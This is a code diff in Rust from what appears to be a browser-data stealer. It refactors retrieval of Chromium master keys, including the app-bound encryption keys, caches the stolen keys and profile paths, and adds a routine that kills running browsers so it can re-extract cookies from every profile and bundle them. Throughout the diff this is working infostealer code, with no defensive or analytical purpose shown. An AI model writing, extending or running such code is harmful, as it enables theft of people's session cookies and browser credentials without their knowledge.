@@ -5,6 +5,7 @@ use base64::{engine::general_purpose, Engine as _};
 use serde_json::Value;
 use crate::encrypted::*;
 
+#[derive(Clone)]
 pub struct MasterKeys {
     pub standard: Vec<u8>,
     pub app_bound: Option<Vec<u8>>,
@@ -34,8 +35,91 @@ pub fn extract_raw_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
     Some(encrypted)
 }
 
+use std::{collections::HashMap, sync::Mutex};
+
+static EXTRACTION_CACHE: Mutex<Option<HashMap<String, CachedBrowser>>> = Mutex::new(None);
+
+#[derive(Clone)]
+struct CachedBrowser {
+    user_data_path: PathBuf,
+    has_profiles: bool,
+    keys: MasterKeys,
+}
+
+fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, keys: &MasterKeys) {
+    if let Ok(mut guard) = EXTRACTION_CACHE.lock() {
+        if guard.is_none() {
+            *guard = Some(HashMap::new());
+        }
+        if let Some(map) = guard.as_mut() {
+            map.insert(
+                browser_name.to_string(),
+                CachedBrowser {
+                    user_data_path: user_data_path.to_path_buf(),
+                    has_profiles,
+                    keys: MasterKeys {
+                        standard: keys.standard.clone(),
+                        app_bound: keys.app_bound.clone(),
+                    },
+                },
+            );
+        }
+    }
+}
+
+/// Re-extract cookies after all browsers are killed (DB unlocked).
+pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
+    let cache = match EXTRACTION_CACHE.lock() {
+        Ok(guard) => guard.clone(),
+        Err(_) => return Vec::new(),
+    };
+    let Some(cache) = cache else { return Vec::new() };
+
+    let mut results = Vec::new();
+    for (browser_name, cached) in cache {
+        let profiles = get_profiles(&cached.user_data_path, cached.has_profiles);
+        for (profile_name, profile_path) in profiles {
+            if let Some(cookies) = extract_cookies(&profile_path, &cached.keys) {
+                crate::browsers::common::zipp::push_profile_bundle(
+                    &mut results,
+                    &browser_name,
+                    &profile_name,
+                    None,
+                    Some(cookies),
+                    None,
+                    None,
+                );
+            }
+        }
+    }
+    results
+}
+
+fn fetch_app_bound(browser_name: &str, json: &Value, has_app_bound: bool) -> Option<Vec<u8>> {
+    if !has_app_bound {
+        return None;
+    }
+    if let Some(k) = crate::browsers::common::dpf::try_from_local_state(json) {
+        if k.len() == 32 {
+            return Some(k);
+        }
+    }
+    if let Some(raw) = extract_app_bound_from_local_state(json) {
+        if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
+            if k.len() == 32 {
+                return Some(k);
+            }
+        }
+    }
+    if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
+        if k.len() == 32 {
+            return Some(k);
+        }
+    }
+    None
+}
+
 pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
-    let _ = browser_name;
     let local_state = user_data_path.join(s_local_state());
     let content = fs::read_to_string(&local_state).ok()?;
     let json: Value = serde_json::from_str(&content).ok()?;
@@ -55,30 +139,9 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
 
     if let Some(ref s) = standard_wrapped {
         if s.len() == 32 {
-            let mut app_bound = if has_app_bound {
-                crate::browsers::common::dpf::try_from_local_state(&json)
-            } else {
-                None
-            };
-            if app_bound.is_none() && has_app_bound {
-                if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
-                    if k.len() == 32 {
-                        app_bound = Some(k);
-                    }
-                }
-            }
-            if app_bound.is_none() && has_app_bound {
-                if let Some(raw) = extract_app_bound_from_local_state(&json) {
-                    if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
-                        if k.len() == 32 {
-                            app_bound = Some(k);
-                        }
-                    }
-                }
-            }
+            let app_bound = fetch_app_bound(browser_name, &json, has_app_bound);
             return Some(MasterKeys { standard: s.clone(), app_bound });
         }
-    } else {
     }
 
     let local_app_bound = if has_app_bound {
@@ -86,32 +149,19 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
     } else {
         None
     };
-    if local_app_bound.is_some() {
-    } else {
-    }
+
     if let (Some(ref wrapped), Some(ref ab)) = (&standard_wrapped, &local_app_bound) {
         if wrapped.len() >= 15 {
             if let Some(unwrapped) = aead_decrypt(wrapped, ab) {
-                return Some(MasterKeys { standard: unwrapped, app_bound: None });
+                return Some(MasterKeys { standard: unwrapped, app_bound: Some(ab.clone()) });
             }
         }
     }
 
     if has_app_bound {
-        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
-            if k.len() == 32 {
-                return Some(MasterKeys { standard: k, app_bound: None });
-            }
-        }
-    }
-
-    if has_app_bound {
-        if let Some(raw) = extract_app_bound_from_local_state(&json) {
-            if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
-                if k.len() == 32 {
-                    return Some(MasterKeys { standard: k, app_bound: None });
-                }
-            }
+        if let Some(k) = fetch_app_bound(browser_name, &json, true) {
+            let standard = standard_wrapped.clone().unwrap_or_default();
+            return Some(MasterKeys { standard, app_bound: Some(k) });
         }
     }
 
@@ -624,20 +674,18 @@ pub fn extract_history(profile_path: &Path) -> Option<String> {
 }
 
 pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) -> Vec<(String, String)> {
-    std::thread::sleep(std::time::Duration::from_millis(1000));
+    std::thread::sleep(std::time::Duration::from_millis(200));
     let mut results = Vec::new();
     if !user_data_path.exists() {
         return results;
     }
-    // Snapshot running browser PIDs *before* we do anything, so we can kill only those
-    // that appeared after (i.e. headless instances we spawned ourselves).
     let pids_before = crate::core::kill::snapshot_browser_pids();
     let keys = get_master_keys(user_data_path, browser_name);
-    // Cleanup: terminate only processes that weren't running before our operation.
-    // Headless instances spawned inside recover_key() are already killed via kill_process_tree()
-    // in Cleanup::drop(), but any child processes that survived are caught here.
+    if let Some(ref k) = keys {
+        cache_browser(browser_name, user_data_path, has_profiles, k);
+    }
     crate::core::kill::kill_new_browsers(&pids_before);
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_millis(300));
     let keys_ref_opt = keys.as_ref();
     let profiles = get_profiles(user_data_path, has_profiles);
     for (profile_name, profile_path) in profiles {
